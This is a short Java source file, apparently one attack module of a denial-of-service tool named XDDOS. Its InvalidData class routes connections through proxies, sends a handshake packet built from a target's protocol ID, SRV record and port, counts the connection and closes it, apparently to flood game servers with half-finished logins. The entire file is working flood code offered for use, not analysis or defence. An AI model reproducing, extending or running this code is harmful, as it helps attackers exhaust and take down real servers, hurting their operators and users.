package XD.XDDOS.methods;

import XD.XDDOS.Main;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import io.netty.channel.Channel;


public class InvalidData
  implements Method
{
  private Handshake handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);

  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(this.handshake);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}
